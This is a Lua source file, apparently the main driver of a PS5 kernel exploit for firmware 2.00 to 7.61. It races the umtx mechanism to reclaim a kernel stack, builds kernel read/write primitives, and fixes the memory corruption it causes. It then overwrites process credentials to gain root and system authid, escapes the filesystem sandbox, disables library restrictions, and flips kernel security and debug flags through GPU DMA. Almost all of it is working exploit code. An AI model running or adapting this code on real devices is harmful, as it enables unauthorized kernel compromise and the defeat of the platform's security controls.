    kernel.addr.curproc = kernel.read_qword(kernel.addr.kprim_curthr + OFFSET_THREAD_TD_PROC) -- td_proc
    kernel.addr.curproc_fd = kernel.read_qword(kernel.addr.curproc + kernel_offset.PROC_FD) -- p_fd (filedesc)
    kernel.addr.curproc_ofiles = kernel.read_qword(kernel.addr.curproc_fd) + kernel_offset.FILEDESC_OFILES -- fdt_nfiles
end

-- use fast kernel r/w to find additional kernel addresses
function get_additional_kernel_address()
    
    kernel.addr.allproc = find_allproc()
    kernel.addr.data_base = kernel.addr.allproc - kernel_offset.DATA_BASE_ALLPROC
    kernel.addr.base = kernel.addr.data_base - kernel_offset.DATA_BASE
    
    local dmap_base, kernel_cr3 = get_dmap_base()
    kernel.addr.dmap_base = dmap_base
    kernel.addr.kernel_cr3 = kernel_cr3
end


function redirect_to_klog()

    local console_fd = syscall.open("/dev/console", O_WRONLY):tonumber()
    if console_fd == -1 then
        error("open() error: " .. get_error_string())
    end

    syscall.dup2(console_fd, STDOUT_FILENO)
    syscall.dup2(STDOUT_FILENO, STDERR_FILENO)
end


-- increase refcounts on socket fds which we corrupt
function fixup_socket()

    local master_sock_addr = get_fd_data_addr(ipv6_kernel_rw.data.master_sock)
    local victim_sock_addr = get_fd_data_addr(ipv6_kernel_rw.data.victim_sock)

    kernel.write_dword(master_sock_addr + 0x0, 0x100)  -- so_count
    kernel.write_dword(victim_sock_addr + 0x0, 0x100)  -- so_count
end

-- we need to increase the refcount on the fd that acquires kernel stack space
function fixup_bad_fds()

    for fd, _ in pairs(umtx.data.fd_tofix) do

        local filedescent_addr = kernel.addr.curproc_ofiles + fd * kernel_offset.SIZEOF_OFILES
        local file_addr = kernel.read_qword(filedescent_addr + 0x0) -- fde_file
        local file_data_addr = kernel.read_qword(file_addr + 0x0) -- f_data

        kernel.write_qword(file_addr + 0x28, 0x10) -- f_count
        kernel.write_qword(file_data_addr + 0x10, 0x10) -- shm_refs
    end
end


-- we also need to zero the thread kstack for the kernel prim thread
function fixup_thread_kstack()

    local thr_kstack_obj = kernel.read_qword(kernel.addr.kprim_curthr + 0x468) -- td_kstack_obj

    kernel.write_qword(kernel.addr.kprim_curthr + 0x470, 0) -- td_kstack
    kernel.write_dword(thr_kstack_obj + 0x84, 0x10) -- ref_count
end


function fixup_corruption()

    assert(kernel.addr.kprim_curthr and kernel.addr.curproc_ofiles)

    dbg("fix up sockets")
    fixup_socket()

    dbg("fix up bad fds")
    fixup_bad_fds()

    dbg("fix up thread kstack")
    fixup_thread_kstack()
    
    print("fixes applied")
end


function escape_filesystem_sandbox(proc)
    
    local proc_fd = kernel.read_qword(proc + kernel_offset.PROC_FD) -- p_fd
    local rootvnode = kernel.read_qword(kernel.addr.data_base + kernel_offset.DATA_BASE_ROOTVNODE)

    kernel.write_qword(proc_fd + 0x10, rootvnode) -- fd_rdir
    kernel.write_qword(proc_fd + 0x18, rootvnode) -- fd_jdir
end


function patch_dynlib_restriction(proc)

    local dynlib_obj_addr = kernel.read_qword(proc + 0x3e8)

    kernel.write_dword(dynlib_obj_addr + 0x118, 0) -- prot (todo: recheck)
    kernel.write_qword(dynlib_obj_addr + 0x18, 1) -- libkernel ref

    -- bypass libkernel address range check (credit @cheburek3000)
    kernel.write_qword(dynlib_obj_addr + 0xf0, 0) -- libkernel start addr
    kernel.write_qword(dynlib_obj_addr + 0xf8, -1) -- libkernel end addr

end


function patch_ucred(ucred, authid)

    kernel.write_dword(ucred + 0x04, 0) -- cr_uid
    kernel.write_dword(ucred + 0x08, 0) -- cr_ruid
    kernel.write_dword(ucred + 0x0C, 0) -- cr_svuid
    kernel.write_dword(ucred + 0x10, 1) -- cr_ngroups
    kernel.write_dword(ucred + 0x14, 0) -- cr_rgid

    -- escalate sony privs
    kernel.write_qword(ucred + OFFSET_UCRED_CR_SCEAUTHID, authid) -- cr_sceAuthID

    -- enable all app capabilities
    kernel.write_qword(ucred + OFFSET_UCRED_CR_SCECAPS, -1) -- cr_sceCaps[0]
    kernel.write_qword(ucred + OFFSET_UCRED_CR_SCECAPS + 8, -1) -- cr_sceCaps[1]

    -- set app attributes
    kernel.write_byte(ucred + OFFSET_UCRED_CR_SCEATTRS, 0x80) -- SceAttrs
end


function escalate_curproc()

    local proc = kernel.addr.curproc

    local ucred = kernel.read_qword(proc + OFFSET_P_UCRED) -- p_ucred
    local authid = SYSTEM_AUTHID

    local uid_before = syscall.getuid():tonumber()
    local in_sandbox_before = syscall.is_in_sandbox():tonumber()

    dbgf("patching curproc %s (authid = %s)", hex(proc), hex(authid))

    patch_ucred(ucred, authid)
    patch_dynlib_restriction(proc)
    escape_filesystem_sandbox(proc)

    local uid_after = syscall.getuid():tonumber()
    local in_sandbox_after = syscall.is_in_sandbox():tonumber()

    printf("we root now? uid: before %d after %d", uid_before, uid_after)
    printf("we escaped now? in sandbox: before %d after %d", in_sandbox_before, in_sandbox_after)
end


function apply_patches_to_kernel_data(accessor)

    local security_flags_addr = kernel.addr.data_base + kernel_offset.DATA_BASE_SECURITY_FLAGS
    local target_id_flags_addr = kernel.addr.data_base + kernel_offset.DATA_BASE_TARGET_ID
    local qa_flags_addr = kernel.addr.data_base + kernel_offset.DATA_BASE_QA_FLAGS
    local utoken_flags_addr = kernel.addr.data_base + kernel_offset.DATA_BASE_UTOKEN_FLAGS
    
    -- Set security flags
    dbg("setting security flags")
    local security_flags = accessor.read_dword(security_flags_addr)
    accessor.write_dword(security_flags_addr, bit64.bor(security_flags, 0x14))

    -- Set targetid to DEX
    dbg("setting targetid")
    accessor.write_byte(target_id_flags_addr, 0x82)

    -- Set qa flags and utoken flags for debug menu enable
    dbg("setting qa flags and utoken flags")
    local qa_flags = accessor.read_dword(qa_flags_addr)
    accessor.write_dword(qa_flags_addr, bit64.bor(qa_flags, 0x10300))

    local utoken_flags = accessor.read_byte(utoken_flags_addr)
    accessor.write_byte(utoken_flags_addr, bit64.bor(utoken_flags, 0x1))
    
    print("debug menu enabled")
end


function setup_kernel_rw()

    -- prepare rops for running in diff threads
    umtx.prepare_shm_lookup_rop()
    umtx.prepare_shm_destroy_rop()
    umtx.prepare_kprim_rop()

    -- race until we can reclaim kstack
    for i=1, umtx.config.max_attempt do
        
        print()
        printf("== attempt #%d ==", i)
        print()

        if umtx.race() then

            if umtx.reclaim_kernel_stack() then
                print("kstack successfully reclaimed")
                break
            end

            -- ask all kprim to exit if not yet win
            print("waiting all kprim threads to exit...")
            memory.write_qword(umtx.data.kprim.exit_signal, 1)
            wait_for(umtx.data.kprim.exited_count, umtx.config.num_kprim_threads)
        end
    end

    return umtx.data.kstack
end


function print_info()

    print("umtx exploit\n")
    printf("running on %s %s", PLATFORM, FW_VERSION)
    printf("game @ %s\n", game_name)

    dbgf("eboot base @ %s", hex(eboot_base))
    dbgf("libc base @ %s", hex(libc_base))
    dbgf("libkernel base @ %s\n", hex(libkernel_base))

    print("exploit config:")
    for k,v in pairs(umtx.config) do
        printf("%s = %s", k, (v))
    end

    print("\nthread config:")
    for k,v in pairs(umtx.thread_config) do
        local core = v.core
        local prio = v.prio
        if k == "destroyer_thread" then
            printf("%s = core %d,%d prio %d", k, core[1], core[2], prio)
        else
            printf("%s = core %d prio %d", k, core, prio)
        end
    end

end


function run_hax()

    local prev_core = get_current_core()
    local prev_rtprio = get_rtprio()

    kstack_kernel_rw.init()
    print_info()

    if not setup_kernel_rw() then
        error("failed to setup kernel r/w")
    end

    kernel.read_buffer = kstack_kernel_rw.read_buffer
    kernel.write_buffer = kstack_kernel_rw.write_buffer

    print("slow kernel r/w achieved")
    
    get_initial_kernel_address()

    -- build faster kernel r/w primitives
    ipv6_kernel_rw.init(kernel.addr.curproc_ofiles, kernel.read_qword, kernel.write_qword)

    kernel.read_buffer = ipv6_kernel_rw.read_buffer
    kernel.write_buffer = ipv6_kernel_rw.write_buffer

    print("fast kernel r/w achieved")

    dbg("fixing up corruptions")
    fixup_corruption()

    get_additional_kernel_address()

    -- patch current process creds
    escalate_curproc()

    update_kernel_offsets()

    -- init GPU DMA for kernel r/w on protected area
    gpu.setup()

    if tonumber(FW_VERSION) >= 7 or force_kdata_patch_with_gpu then
        print("applying patches to kernel data (with GPU DMA method)")
        apply_patches_to_kernel_data(gpu)
    else
        print("applying patches to kernel data")
        apply_patches_to_kernel_data(kernel)
    end

    redirect_to_klog()
    print("stdout/stderr is redirected to klog")

    -- exit kprim
    kstack_kernel_rw.send_cmd_to_kprim_thread(kstack_kernel_rw.cmd.exit, 0)

    dbg("kernel addr dump:")
    dbg(dump_table(kernel.addr))

    -- persist exploitation state
    storage.set("kernel_rw", {
        umtx_data = umtx.data,
        ipv6_kernel_rw_data = ipv6_kernel_rw.data,
        kernel_addr = kernel.addr
    })

    print("exploit state is saved into storage")

    print("restoring to previous core/rtprio")

    pin_to_core(prev_core)
    set_rtprio(prev_rtprio)

    print("done!")
end

function main()

    if PLATFORM ~= "ps5" or tonumber(FW_VERSION) < 2 or tonumber(FW_VERSION) > 7.61 then
        printf("this exploit only works on ps5 (2.00 <= fw <= 7.61) (current %s %s)", PLATFORM, FW_VERSION)
        return
    end

    if is_jailbroken() then
        print("process already jailbroken")
        return
    end

    run_hax() -- start exploit
end

main()